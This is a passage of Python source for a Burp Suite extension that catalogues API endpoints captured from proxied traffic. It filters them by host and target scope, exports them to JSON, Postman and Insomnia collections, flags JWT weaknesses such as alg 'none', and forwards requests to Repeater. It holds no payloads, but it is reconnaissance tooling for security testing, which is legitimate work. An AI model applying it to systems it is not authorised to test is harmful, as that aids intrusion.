                        items_to_add.append("=== {} ===".format(group_name))
                    item_count += 1
                    for key in sorted(groups[group_name]):
                        if item_count >= end_idx:
                            break
                        if item_count >= start_idx:
                            tags = tags_snapshot.get(key, [])
                            tag_str = " [{}]".format(",".join(tags)) if tags else ""
                            entries = filtered[key]
                            entry = self._get_entry(entries)
                            count = len(entries) if isinstance(entries, list) else 1
                            items_to_add.append(
                                "  [{}x] {} @ {}{}".format(
                                    count, key, entry["host"], tag_str
                                )
                            )
                        item_count += 1

            # Single UI update
            self.list_model.clear()
            for item in items_to_add:
                self.list_model.addElement(item)

        except Exception as e:
            self._callbacks.printError("Refresh view error: " + str(e))

    def _group_endpoints(self, endpoints, group_by):
        groups = {}
        for key, entries in endpoints.items():
            entry = self._get_entry(entries)
            if group_by == "Host":
                group_name = entry["host"]
            elif group_by == "Method":
                group_name = entry["method"]
            elif group_by == "Auth":
                auth = entry["auth_detected"]
                group_name = auth[0] if auth else "None"
            elif group_by == "Encryption":
                enc = entry.get("encryption_indicators", {}).get("likely_encrypted")
                group_name = "Encrypted" if enc else "Plain"
            else:
                group_name = "Other"

            if group_name not in groups:
                groups[group_name] = []
            groups[group_name].append(key)
        return groups

    def _update_tab_title(self):
        """Update tab title with count"""
        count = len(self.api_data)
        self._callbacks.setExtensionName(
            "API Security Suite"
            if count == 0
            else "API Security Suite ({})".format(count)
        )

    def _update_stats(self):
        """Update statistics panel"""
        with self.lock:
            total = len(self.api_data)
            hosts = len(set(self._get_entry(e)["host"] for e in self.api_data.values()))
            severity_counts = {"critical": 0, "high": 0, "medium": 0}
            for key, entries in self.api_data.items():
                sev = self._get_severity(key, entries)
                if sev in severity_counts:
                    severity_counts[sev] += 1

        self.stats_label.setText(
            "Endpoints: {} | Critical: {} | High: {} | Medium: {} | Hosts: {}".format(
                total,
                severity_counts["critical"],
                severity_counts["high"],
                severity_counts["medium"],
                hosts,
            )
        )

    def _update_host_filter(self):
        """Update host filter dropdown"""
        with self.lock:
            hosts = sorted(
                set(self._get_entry(e)["host"] for e in self.api_data.values())
            )
        current = str(self.host_filter.getSelectedItem())
        self.host_filter.removeAllItems()
        self.host_filter.addItem("All")
        for host in hosts:
            self.host_filter.addItem(host)
        if current in hosts or current == "All":
            self.host_filter.setSelectedItem(current)

    def _schedule_capture_ui_refresh(self, force=False):
        """Debounce expensive Recon UI refresh work during bursty captures."""
        timer = None
        with self.lock:
            if force and self._capture_ui_refresh_timer is not None:
                try:
                    self._capture_ui_refresh_timer.cancel()
                except Exception as cancel_err:
                    self._callbacks.printError(
                        "Capture UI refresh cancel error: {}".format(str(cancel_err))
                    )
                self._capture_ui_refresh_timer = None

            if self._capture_ui_refresh_timer is not None:
                return

            now = time.time()
            elapsed_ms = int((now - self._capture_ui_refresh_last_ts) * 1000)
            delay_ms = 0
            if not force:
                delay_ms = max(
                    0, int(self._capture_ui_refresh_min_interval_ms - elapsed_ms)
                )

            def _queue_refresh():
                with self.lock:
                    self._capture_ui_refresh_timer = None
                    self._capture_ui_refresh_last_ts = time.time()
                SwingUtilities.invokeLater(lambda: self._run_capture_ui_refresh())

            timer = threading.Timer(delay_ms / 1000.0, _queue_refresh)
            timer.daemon = True
            self._capture_ui_refresh_timer = timer

        if timer is not None:
            timer.start()

    def _run_capture_ui_refresh(self):
        """Apply a full Recon list/stats refresh on the EDT."""
        try:
            renderer = self.endpoint_list.getCellRenderer()
            if renderer:
                renderer.invalidate_cache()
            self._update_host_filter()
            self._update_stats()
            self.refresh_view()
        except Exception as e:
            self._callbacks.printError("Capture UI refresh error: {}".format(str(e)))

    def _open_target_base_scope_popup(self):
        """Open popup editor for multiline base URL/host targeting scope."""
        current_text = "\n".join(self.target_base_scope_lines)
        editor = JTextArea(current_text, 12, 60)
        editor.setLineWrap(False)
        editor.setWrapStyleWord(False)

        content = JPanel(BorderLayout(0, 6))
        content.add(
            JLabel(
                "Enter one base URL/host per line (examples: https://www.allocine.fr, allocine.fr)"
            ),
            BorderLayout.NORTH,
        )
        content.add(JScrollPane(editor), BorderLayout.CENTER)

        decision = JOptionPane.showConfirmDialog(
            self._panel,
            content,
            "Target Base URLs",
            JOptionPane.OK_CANCEL_OPTION,
            JOptionPane.PLAIN_MESSAGE,
        )
        if decision != JOptionPane.OK_OPTION:
            return

        parsed = self._parse_target_base_scope_text(editor.getText())
        self.target_base_scope_lines = parsed["lines"]
        self.target_base_scope_hosts = parsed["hosts"]
        self.target_base_scope_bases = parsed["bases"]

        line_count = len(self.target_base_scope_lines)
        if line_count == 0:
            self.log_to_ui("[*] Target base scope cleared")
            return

        scope_msg = (
            "[+] Target base scope updated: {} lines, {} hosts, {} base domains".format(
                line_count,
                len(self.target_base_scope_hosts),
                len(self.target_base_scope_bases),
            )
        )
        if parsed["invalid_count"] > 0:
            scope_msg += " ({} invalid ignored)".format(parsed["invalid_count"])
        self.log_to_ui(scope_msg)

    def _parse_target_base_scope_text(self, text):
        """Parse multiline target scope input into host/base-domain sets."""
        lines = []
        hosts = set()
        bases = set()
        invalid_count = 0
        seen = set()
        for raw_line in self._ascii_safe(text).splitlines():
            line = self._ascii_safe(raw_line).strip()
            if not line or line.startswith("#"):
                continue
            if line in seen:
                continue
            seen.add(line)
            host = self._extract_scope_host(line)
            if not host:
                invalid_count += 1
                continue
            lines.append(line)
            hosts.add(host)
            base = self._infer_base_domain(host)
            if base:
                bases.add(base)
        return {
            "lines": lines,
            "hosts": hosts,
            "bases": bases,
            "invalid_count": invalid_count,
        }

    def _extract_scope_host(self, value):
        """Extract host from URL/host text for manual scope filtering."""
        text = self._ascii_safe(value, lower=True).strip()
        if not text:
            return ""

        probe = text
        if "://" not in probe:
            probe = "https://" + probe.lstrip("/")
        host = ""
        try:
            parsed = URL(probe)
            host = self._ascii_safe(parsed.getHost(), lower=True).strip()
        except Exception as e:
            self._callbacks.printError(
                "Target scope parser fallback for '{}': {}".format(probe, str(e))
            )
            host = ""

        if not host:
            fallback = text.split("/")[0].split("?")[0].split("#")[0].strip()
            host = self._ascii_safe(fallback, lower=True).strip()

        if not host:
            return ""

        if host.endswith("."):
            host = host[:-1]
        if ":" in host and host.count(":") == 1:
            host = host.split(":", 1)[0].strip()
        if not host or " " in host:
            return ""
        return host

    def _get_target_scope_override(self):
        """Return effective manual scope override state for external scans."""
        lines = list(self.target_base_scope_lines)
        hosts = set(self.target_base_scope_hosts)
        bases = set(self.target_base_scope_bases)
        enabled = bool(self.target_base_scope_only_enabled and (hosts or bases))
        return {
            "enabled": enabled,
            "lines": lines,
            "hosts": hosts,
            "bases": bases,
        }

    def _host_matches_target_scope(self, host, scope_override):
        """Check if a host belongs to manual base URL scope (exact or derivative)."""
        text = self._ascii_safe(host, lower=True).strip()
        if not text:
            return False
        if text in scope_override.get("hosts", set()):
            return True
        base = self._infer_base_domain(text)
        if not base:
            return False
        return base in scope_override.get("bases", set())

    def export_by_host(self):
        """Export endpoints for selected host only"""
        host = str(self.host_filter.getSelectedItem())
        if host == "All":
            with self.lock:
                hosts = sorted(
                    set(self._get_entry(e)["host"] for e in self.api_data.values())
                )
            if not hosts:
                self.log_to_ui("[!] No hosts to export")
                return
            host = str(
                JOptionPane.showInputDialog(
                    self._panel,
                    "Select host to export:",
                    "Export Host",
                    JOptionPane.QUESTION_MESSAGE,
                    None,
                    hosts,
                    hosts[0],
                )
            )
            if not host:
                return

        with self.lock:
            filtered_data = {
                k: v
                for k, v in self.api_data.items()
                if self._get_entry(v)["host"] == host
            }
        if not filtered_data:
            self.log_to_ui("[!] No endpoints for host: {}".format(host))
            return

        self.log_to_ui(
            "[*] Exporting {} endpoints for {}".format(len(filtered_data), host)
        )
        self._export_data(filtered_data, "_" + host.replace(".", "_"))

    def _select_export_scope_data(self, export_name):
        """Select export scope and return (scope_label, data dict)."""
        if not self.api_data:
            self.log_to_ui("[!] No API data to export")
            return None, None

        options = ["All Endpoints", "Filtered View", "Current Host"]
        selected = JOptionPane.showInputDialog(
            self._panel,
            "Select scope for {} export:".format(export_name),
            "{} Export Scope".format(export_name),
            JOptionPane.QUESTION_MESSAGE,
            None,
            options,
            options[1],
        )
        if selected is None:
            return None, None

        scope = str(selected)
        if scope == "All Endpoints":
            with self.lock:
                return scope, dict(self.api_data)

        if scope == "Filtered View":
            with self.lock:
                filtered = dict(self._filter_endpoints())
            if not filtered:
                self.log_to_ui("[!] Filtered view is empty")
                return None, None
            return scope, filtered

        host = str(self.host_filter.getSelectedItem())
        if host == "All":
            with self.lock:
                hosts = sorted(
                    set(self._get_entry(e)["host"] for e in self.api_data.values())
                )
            if not hosts:
                self.log_to_ui("[!] No hosts available for export")
                return None, None
            host = JOptionPane.showInputDialog(
                self._panel,
                "Select host for {} export:".format(export_name),
                "{} Host".format(export_name),
                JOptionPane.QUESTION_MESSAGE,
                None,
                hosts,
                hosts[0],
            )
            if host is None:
                return None, None
            host = str(host)

        with self.lock:
            host_data = {
                k: v
                for k, v in self.api_data.items()
                if self._get_entry(v)["host"] == host
            }
        if not host_data:
            self.log_to_ui("[!] No endpoints for host: {}".format(host))
            return None, None
        return "Host: {}".format(host), host_data

    def _split_path_segments(self, path):
        """Split path into non-empty segments for export clients."""
        safe_path = self._ascii_safe(path or "/").strip()
        if not safe_path.startswith("/"):
            safe_path = "/" + safe_path
        return [segment for segment in safe_path.split("/") if segment]

    def _parse_query_pairs(self, query_string):
        """Parse query string into ordered key/value pairs."""
        pairs = []
        safe_query = self._ascii_safe(query_string or "").strip()
        if not safe_query:
            return pairs
        for part in safe_query.split("&"):
            if not part:
                continue
            if "=" in part:
                key, value = part.split("=", 1)
            else:
                key, value = part, ""
            pairs.append(
                {
                    "key": self._ascii_safe(key),
                    "value": self._ascii_safe(value),
                }
            )
        return pairs

    def _build_entry_url(self, entry):
        """Build full URL and normalized components from a captured entry."""
        protocol = self._ascii_safe(entry.get("protocol") or "https", lower=True).strip() or "https"
        host = self._ascii_safe(entry.get("host") or "").strip()
        if not host:
            return "", protocol, host, "", []

        path = self._ascii_safe(
            entry.get("path") or entry.get("normalized_path") or "/"
        ).strip()
        if not path.startswith("/"):
            path = "/" + path
        query_string = self._ascii_safe(entry.get("query_string") or "").strip()
        url = "{}://{}{}".format(protocol, host, path)
        if query_string:
            url += "?" + query_string
        return url, protocol, host, path, self._parse_query_pairs(query_string)

    def _build_postman_collection(self, data_to_export, collection_name):
        """Build Postman Collection v2.1 payload from endpoint data."""
        host_groups = {}
        for endpoint_key, entries in data_to_export.items():
            entry = self._get_entry(entries)
            host = self._ascii_safe(entry.get("host") or "unknown-host")
            if host not in host_groups:
                host_groups[host] = []
            host_groups[host].append((endpoint_key, entries))

        postman_items = []
        for host in sorted(host_groups.keys()):
            request_items = []
            for endpoint_key, entries in sorted(host_groups[host], key=lambda item: item[0]):
                entry = self._get_entry(entries)
                method = self._ascii_safe(entry.get("method") or "GET").upper()
                url, protocol, host_value, path, query_pairs = self._build_entry_url(entry)
                headers = []
                raw_headers = entry.get("headers", {})
                if isinstance(raw_headers, dict):
                    for key, value in raw_headers.items():
                        name = self._ascii_safe(key).strip()
                        header_value = self._ascii_safe(value).strip()
                        if not name:
                            continue
                        if name.lower() in ["host", "content-length", "connection"]:
                            continue
                        headers.append({"key": name, "value": header_value})

                request_obj = {
                    "method": method,
                    "header": headers,
                    "url": {
                        "raw": url,
                        "protocol": protocol,
                        "host": [part for part in host_value.split(".") if part],
                        "path": self._split_path_segments(path),
                        "query": query_pairs,
                    },
                }

                raw_body = self._ascii_safe(entry.get("request_body") or "")
                if raw_body and method in ["POST", "PUT", "PATCH", "DELETE"]:
                    request_obj["body"] = {"mode": "raw", "raw": raw_body}

                request_items.append(
                    {
                        "name": self._ascii_safe(endpoint_key),
                        "request": request_obj,
                        "response": [],
                    }
                )

            postman_items.append({"name": host, "item": request_items})

        return {
            "info": {
                "name": self._ascii_safe(collection_name),
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
                "description": "Generated by BurpAPISecuritySuite",
            },
            "item": postman_items,
        }

    def _build_insomnia_export(self, data_to_export, workspace_name):
        """Build Insomnia export JSON payload from endpoint data."""
        workspace_id = "wrk_burpapisecuritysuite"
        env_id = "env_burpapisecuritysuite"
        resources = [
            {
                "_id": workspace_id,
                "_type": "workspace",
                "name": self._ascii_safe(workspace_name),
            },
            {
                "_id": env_id,
                "_type": "environment",
                "parentId": workspace_id,
                "name": "Base Environment",
                "data": {},
            },
        ]

        host_groups = {}
        for endpoint_key, entries in data_to_export.items():
            entry = self._get_entry(entries)
            host = self._ascii_safe(entry.get("host") or "unknown-host")
            if host not in host_groups:
                host_groups[host] = []
            host_groups[host].append((endpoint_key, entries))

        request_counter = 1
        group_counter = 1
        for host in sorted(host_groups.keys()):
            group_id = "fld_{:04d}".format(group_counter)
            group_counter += 1
            resources.append(
                {
                    "_id": group_id,
                    "_type": "request_group",
                    "parentId": workspace_id,
                    "name": host,
                }
            )

            for endpoint_key, entries in sorted(host_groups[host], key=lambda item: item[0]):
                entry = self._get_entry(entries)
                method = self._ascii_safe(entry.get("method") or "GET").upper()
                url, _, _, _, query_pairs = self._build_entry_url(entry)
                headers = []
                raw_headers = entry.get("headers", {})
                if isinstance(raw_headers, dict):
                    for key, value in raw_headers.items():
                        name = self._ascii_safe(key).strip()
                        header_value = self._ascii_safe(value).strip()
                        if not name:
                            continue
                        if name.lower() in ["host", "content-length", "connection"]:
                            continue
                        headers.append({"name": name, "value": header_value})

                request_obj = {
                    "_id": "req_{:05d}".format(request_counter),
                    "_type": "request",
                    "parentId": group_id,
                    "name": self._ascii_safe(endpoint_key),
                    "method": method,
                    "url": url,
                    "parameters": [
                        {"name": pair["key"], "value": pair["value"]}
                        for pair in query_pairs
                    ],
                    "headers": headers,
                }

                raw_body = self._ascii_safe(entry.get("request_body") or "")
                if raw_body and method in ["POST", "PUT", "PATCH", "DELETE"]:
                    request_obj["body"] = {
                        "mimeType": "application/json",
                        "text": raw_body,
                    }

                resources.append(request_obj)
                request_counter += 1

        return {
            "_type": "export",
            "__export_format": 4,
            "__export_date": SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(Date()),
            "__export_source": "burpapisecuritysuite",
            "resources": resources,
        }

    def _export_postman_collection(self):
        """Export Recon data as Postman Collection v2.1 JSON."""
        scope_label, data_to_export = self._select_export_scope_data("Postman")
        if not data_to_export:
            return

        export_dir = self._get_export_dir("Postman_Export")
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return

        import os

        collection_name = "Burp API Security Suite ({})".format(scope_label)
        collection = self._build_postman_collection(data_to_export, collection_name)
        filepath = os.path.join(export_dir, "postman_collection.json")
        writer = None
        try:
            writer = FileWriter(filepath)
            writer.write(json.dumps(collection, indent=2))
            host_count = len(set(self._get_entry(v)["host"] for v in data_to_export.values()))
            self.log_to_ui(
                "[+] Postman export: {} endpoints, {} hosts".format(
                    len(data_to_export), host_count
                )
            )
            self.log_to_ui("[+] Folder: {}".format(export_dir))
            self.log_to_ui("[+] File: {}".format(filepath))
        except Exception as e:
            self.log_to_ui("[!] Postman export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing Postman export file: {}".format(str(e))
                    )

    def _export_insomnia_collection(self):
        """Export Recon data as Insomnia import JSON."""
        scope_label, data_to_export = self._select_export_scope_data("Insomnia")
        if not data_to_export:
            return

        export_dir = self._get_export_dir("Insomnia_Export")
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return

        import os

        workspace_name = "Burp API Security Suite ({})".format(scope_label)
        export_payload = self._build_insomnia_export(data_to_export, workspace_name)
        filepath = os.path.join(export_dir, "insomnia_collection.json")
        writer = None
        try:
            writer = FileWriter(filepath)
            writer.write(json.dumps(export_payload, indent=2))
            host_count = len(set(self._get_entry(v)["host"] for v in data_to_export.values()))
            self.log_to_ui(
                "[+] Insomnia export: {} endpoints, {} hosts".format(
                    len(data_to_export), host_count
                )
            )
            self.log_to_ui("[+] Folder: {}".format(export_dir))
            self.log_to_ui("[+] File: {}".format(filepath))
        except Exception as e:
            self.log_to_ui("[!] Insomnia export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing Insomnia export file: {}".format(str(e))
                    )

    def import_data(self):
        """Import previously exported JSON"""
        chooser = JFileChooser()
        chooser.setDialogTitle("Import API Security Suite JSON")
        if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
            filepath = chooser.getSelectedFile().getAbsolutePath()
            try:
                with open(filepath, "r") as f:
                    data = json.load(f)

                imported = 0
                for endpoint in data.get("endpoints", []):
                    key = endpoint["endpoint"]
                    with self.lock:
                        if key not in self.api_data:
                            # Reconstruct entry with all required fields
                            sample_req = (
                                endpoint.get("sample_requests", [{}])[0]
                                if endpoint.get("sample_requests")
                                else {}
                            )
                            resp_codes = endpoint.get("response_codes", [])
                            content_types = endpoint.get("content_types", [])
                            entry = {
                                "method": endpoint["method"],
                                "path": sample_req.get(
                                    "path", endpoint["normalized_path"]
                                ),
                                "normalized_path": endpoint["normalized_path"],
                                "host": endpoint["host"],
                                "protocol": "https",
                                "port": 443,
                                "query_string": sample_req.get("query", ""),
                                "parameters": endpoint.get(
                                    "parameters",
                                    {"url": {}, "body": {}, "cookie": {}, "json": {}},
                                ),
                                "headers": sample_req.get("headers", {}),
                                "request_body": sample_req.get("request_body", ""),
                                "response_status": resp_codes[0] if resp_codes else 200,
                                "response_headers": {},
                                "response_body": sample_req.get("response_body", ""),
                                "response_length": int(
                                    endpoint.get("avg_response_length", 0)
                                ),
                                "response_time_ms": 0,
                                "content_type": (
                                    content_types[0] if content_types else "unknown"
                                ),
                                "auth_detected": endpoint.get("auth_methods", ["None"]),
                                "api_patterns": endpoint.get("api_patterns", []),
                                "jwt_detected": endpoint.get("jwt_claims"),
                                "encryption_indicators": {
                                    "likely_encrypted": endpoint.get(
                                        "encryption_detected", False
                                    ),
                                    "types": endpoint.get("encryption_types", []),
                                },
                                "param_patterns": {
                                    "reflected": endpoint.get("reflected_params", []),
                                    "param_types": endpoint.get(
                                        "param_type_summary", {}
                                    ),
                                },
                            }

                            self.api_data[key] = [entry]
                            self.endpoint_tags[key] = self._auto_tag(entry)
                            self.endpoint_times[key] = [0]
                            imported += 1

                self.log_to_ui(
                    "[+] Imported {} endpoints from {}".format(imported, filepath)
                )
                SwingUtilities.invokeLater(
                    lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
                )
                SwingUtilities.invokeLater(lambda: self._update_host_filter())
                SwingUtilities.invokeLater(lambda: self._update_stats())
                SwingUtilities.invokeLater(lambda: self.refresh_view())
            except Exception as e:
                self.log_to_ui("[!] Import failed: {}".format(str(e)))
                import traceback

                self._callbacks.printError(traceback.format_exc())

    def _export_data(self, data_to_export, suffix=""):
        """Helper to export data"""
        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        analysis = {
            "metadata": {
                "timestamp": timestamp,
                "total_endpoints": len(data_to_export),
                "total_requests": sum(len(v) for v in data_to_export.values()),
            },
            "endpoints": [],
            "api_structure": self._analyze_structure_for(data_to_export),
            "security_observations": self._analyze_security_for(data_to_export),
            "llm_prompt": self._generate_llm_prompt(),
        }

        for endpoint_key, entries in data_to_export.items():
            entry = self._get_entry(entries)
            entries_list = entries if isinstance(entries, list) else [entries]
            endpoint_summary = {
                "endpoint": endpoint_key,
                "method": entry["method"],
                "normalized_path": entry["normalized_path"],
                "host": self._get_entry(entries)["host"],
                "sample_count": len(entries_list),
                "parameters": self._merge_params(entries_list),
                "auth_methods": list(
                    set([a for e in entries_list for a in e["auth_detected"]])
                ),
                "response_codes": list(
                    set([e["response_status"] for e in entries_list])
                ),
                "content_types": list(set([e["content_type"] for e in entries_list])),
                "api_patterns": list(
                    set([p for e in entries_list for p in e["api_patterns"]])
                ),
                "avg_response_length": sum(e["response_length"] for e in entries_list)
                / len(entries_list),
                "avg_response_time_ms": sum(
                    e.get("response_time_ms", 0) for e in entries_list
                )
                / len(entries_list),
                "jwt_claims": entry.get("jwt_detected"),
                "encryption_detected": any(
                    e.get("encryption_indicators", {}).get("likely_encrypted")
                    for e in entries_list
                ),
                "encryption_types": list(
                    set(
                        [
                            t
                            for e in entries_list
                            for t in e.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
                "reflected_params": list(
                    set(
                        [
                            p
                            for e in entries_list
                            for p in e.get("param_patterns", {}).get("reflected", [])
                        ]
                    )
                ),
                "param_type_summary": self._summarize_param_types(entries_list),
                "sample_requests": [self._format_sample(e) for e in entries_list[:3]],
            }
            analysis["endpoints"].append(endpoint_summary)

        import os

        host_name = suffix.replace("_", "").replace(".", "_") if suffix else ""
        export_dir = self._get_export_dir("HostExport{}".format(host_name))
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return
        filename = os.path.join(export_dir, "api_analysis.json")
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(analysis, indent=2))
            self.log_to_ui(
                "[+] Exported {} endpoints to: {}".format(
                    len(data_to_export), export_dir
                )
            )
        except Exception as e:
            self.log_to_ui("[!] Export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError("Error closing writer: " + str(e))

    def _analyze_structure_for(self, data):
        """Analyze structure for specific dataset"""
        structure = {
            "api_types": set(),
            "http_methods": set(),
            "auth_methods": set(),
            "base_paths": set(),
        }
        for entries in data.values():
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                structure["http_methods"].add(entry["method"])
                structure["auth_methods"].update(entry["auth_detected"])
                structure["api_types"].update(entry["api_patterns"])
                path = entry["normalized_path"]
                if path.startswith("/api/"):
                    structure["base_paths"].add("/api/")
                elif path.startswith("/v1/"):
                    structure["base_paths"].add("/v1/")
        return {k: list(v) for k, v in structure.items()}

    def _analyze_security_for(self, data):
        """Analyze security for specific dataset"""
        return self._analyze_security(data)

    def show_endpoint_details(self, endpoint_key):
        """Show detailed information for selected endpoint"""
        with self.lock:
            if endpoint_key not in self.api_data:
                return
            entries = self.api_data[endpoint_key]
            times = self.endpoint_times.get(endpoint_key, [])

        entries_list = entries if isinstance(entries, list) else [entries]
        times_list = times if isinstance(times, list) else [times]
        severity = self._get_severity(endpoint_key, entries)

        details = []
        details.append("=" * 80)
        details.append("ENDPOINT: {}".format(endpoint_key))
        details.append("Host: {}".format(self._get_entry(entries)["host"]))
        details.append("Severity: {}".format(severity.upper()))
        details.append("Samples: {}".format(len(entries_list)))
        details.append("=" * 80)
        details.append("")

        # Response times
        if times_list:
            avg_time = sum(times_list) / len(times_list)
            details.append(
                "Response Times: Avg={}ms, Min={}ms, Max={}ms".format(
                    int(avg_time), min(times_list), max(times_list)
                )
            )

        # Auth
        auth = list(set([a for e in entries_list for a in e["auth_detected"]]))
        details.append("Authentication: {}".format(", ".join(auth)))

        # Parameters
        params = self._merge_params(entries_list)
        if any(params.values()):
            details.append("")
            details.append("Parameters:")
            for ptype, pnames in params.items():
                if pnames:
                    details.append("  {}: {}".format(ptype, ", ".join(pnames[:10])))

        # Response codes
        codes = list(set([e["response_status"] for e in entries_list]))
        details.append("")
        details.append("Response Codes: {}".format(", ".join(map(str, codes))))

        # Content types
        ctypes = list(set([e["content_type"] for e in entries_list]))
        details.append("Content Types: {}".format(", ".join(ctypes)))

        # Encryption
        enc_types = list(
            set(
                [
                    t
                    for e in entries_list
                    for t in e.get("encryption_indicators", {}).get("types", [])
                ]
            )
        )
        if enc_types:
            details.append("Encryption: {}".format(", ".join(enc_types)))

        # Reflected params
        reflected = list(
            set(
                [
                    p
                    for e in entries_list
                    for p in e.get("param_patterns", {}).get("reflected", [])
                ]
            )
        )
        if reflected:
            details.append("Reflected Parameters: {}".format(", ".join(reflected)))

        # JWT Details
        jwt_data = None
        for e in entries_list:
            if e.get("jwt_detected"):
                jwt_data = e.get("jwt_detected")
                break

        if jwt_data:
            details.append("")
            details.append("-" * 80)
            details.append("JWT TOKEN DETECTED")
            details.append("-" * 80)
            details.append("Location: {}".format(jwt_data.get("location", "Unknown")))
            details.append("")
            details.append("Header:")
            for k, v in jwt_data.get("header", {}).items():
                details.append("  {}: {}".format(k, v))
            details.append("")
            details.append("Payload:")
            for k, v in jwt_data.get("payload", {}).items():
                details.append("  {}: {}".format(k, v))
            details.append("")
            details.append("Signature: {}...".format(jwt_data.get("signature", "")[:50]))
            details.append("")

            # Security analysis
            header = jwt_data.get("header", {})
            payload = jwt_data.get("payload", {})
            alg = header.get("alg", "")

            details.append("Security Analysis:")
            if alg.lower() in ["none", "null"]:
                details.append("  [CRITICAL] Algorithm is 'none' - signature not verified!")
            elif alg.startswith("HS"):
                details.append("  [INFO] HMAC algorithm ({}) - symmetric key".format(alg))
            elif alg.startswith("RS") or alg.startswith("ES"):
                details.append("  [INFO] Asymmetric algorithm ({})".format(alg))

            if "exp" in payload:
                import time
                exp = payload.get("exp")
                try:
                    integer_types = (int, long)  # noqa: F821 (Python2/Jython)
                except NameError:
                    integer_types = (int,)
                if isinstance(exp, integer_types):
                    if exp < time.time():
                        details.append("  [WARNING] Token is EXPIRED")
                    else:
                        details.append("  [INFO] Token expires: {}".format(exp))
            else:
                details.append("  [WARNING] No expiration claim (exp)")

            if "iat" not in payload:
                details.append("  [WARNING] No issued-at claim (iat)")

            if "sub" not in payload and "user" not in payload and "userId" not in payload:
                details.append("  [INFO] No user identifier found in standard claims")

        # Sample request/response
        details.append("")
        details.append("-" * 80)
        details.append("SAMPLE REQUEST #1:")
        details.append("-" * 80)
        sample = self._get_entry(entries)
        details.append("{} {}".format(sample["method"], sample["path"]))
        if sample.get("query_string"):
            details.append("Query: {}".format(sample["query_string"]))
        details.append("")
        for k, v in list(sample.get("headers", {}).items())[:10]:
            details.append("{}: {}".format(k, str(v)[:100]))
        if sample.get("request_body"):
            details.append("")
            details.append("Body: {}".format(sample["request_body"][:500]))

        details.append("")
        details.append("-" * 80)
        details.append("SAMPLE RESPONSE #1:")
        details.append("-" * 80)
        details.append("Status: {}".format(sample["response_status"]))
        details.append("Length: {} bytes".format(sample["response_length"]))
        if sample.get("response_body"):
            details.append("")
            details.append("Body: {}".format(sample["response_body"][:500]))

        self.details_area.setText("\n".join(details))
        self.details_area.setCaretPosition(0)

    def createMenuItems(self, invocation):
        """Create context menu items"""
        menu_items = ArrayList()

        # Only show menu for requests
        if invocation.getInvocationContext() in [
            invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
            invocation.CONTEXT_MESSAGE_VIEWER_REQUEST,
        ]:
            messages = invocation.getSelectedMessages()
            if messages and len(messages) > 0:
                menu_item = JMenuItem("Send to API Security Suite")
                menu_item.addActionListener(lambda e: self._send_to_recon(messages[0]))
                menu_items.add(menu_item)

                repeater_item = JMenuItem("Send to Repeater")
                repeater_item.addActionListener(
                    lambda e: self._send_to_repeater(messages[0])
                )
                menu_items.add(repeater_item)

        return menu_items if menu_items.size() > 0 else None

    def _send_to_recon(self, messageInfo):
        """Manually add request to API Security Suite"""
        self.log_to_ui("[*] Manually adding request to API Security Suite...")
        self._process_traffic(messageInfo)

    def _send_to_repeater(self, messageInfo):
        """Send request to Burp Repeater"""
        httpService = messageInfo.getHttpService()
        self._callbacks.sendToRepeater(
            httpService.getHost(),
            httpService.getPort(),
            httpService.getProtocol() == "https",
            messageInfo.getRequest(),
            None,
        )
        self.log_to_ui(
            "[+] Sent to Repeater: {}://{}".format(
                httpService.getProtocol(), httpService.getHost()
            )
        )

    def _send_endpoint_to_repeater(self, endpoint_key):
        """Reconstruct and send endpoint to Repeater"""
        with self.lock:
            if endpoint_key not in self.api_data:
                return
            entries = self.api_data[endpoint_key]
        entry = self._get_entry(entries)

        # Build request line
        path = entry["path"]
        if entry.get("query_string"):
            path += "?" + entry["query_string"]
        request_line = "{} {} HTTP/1.1\r\n".format(entry["method"], path)

        # Build headers
        headers = []
        headers.append("Host: {}".format(entry["host"]))
        for k, v in entry.get("headers", {}).items():
            if k.lower() != "host":
                headers.append("{}: {}".format(k, v))

        # Build full request
        request_str = request_line + "\r\n".join(headers) + "\r\n\r\n"
        if entry.get("request_body"):
            request_str += entry["request_body"]

        request_bytes = self._helpers.stringToBytes(request_str)

        # Send to Repeater
        use_https = entry["protocol"] == "https"
        port = entry["port"]
        if port == -1:
            port = 443 if use_https else 80

        self._callbacks.sendToRepeater(
            entry["host"], port, use_https, request_bytes, endpoint_key
        )
        self.log_to_ui("[+] Sent to Repeater: {}".format(endpoint_key))

    def _build_url(self, entry, include_path=True):
        """Helper to build URL from entry"""
        port = (
            entry["port"]
            if entry["port"] != -1
            else (443 if entry["protocol"] == "https" else 80)
        )
        base = "{}://{}:{}".format(entry["protocol"], entry["host"], port)
        return base + entry["path"] if include_path else base

    def _export_urls_to_file(
        self, export_dir, filename, include_path=True, unique_hosts=False
    ):
        """Helper to export URLs to file"""
        import os

        filepath = os.path.join(export_dir, filename)
        writer = None
        try:
            writer = FileWriter(filepath)
            with self.lock:
                data_snapshot = list(self.api_data.items())
            if unique_hosts:
                hosts = set()
                for key, entries in data_snapshot:
                    url = self._build_url(self._get_entry(entries), False)
                    if url not in hosts:
                        hosts.add(url)
                        writer.write(url + "\n")
            else:
                for _, entries in data_snapshot:
                    writer.write(
                        self._build_url(self._get_entry(entries), include_path) + "\n"
                    )
            return filepath
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing file {}: {}".format(filepath, str(e))
                    )

    def _run_tool_async(self, cmd, output_area, result_processor=None):
        """
        Run external tool asynchronously with heartbeat and result processing.
        Fixes hanging UI and missing output issues.
        """
        import os
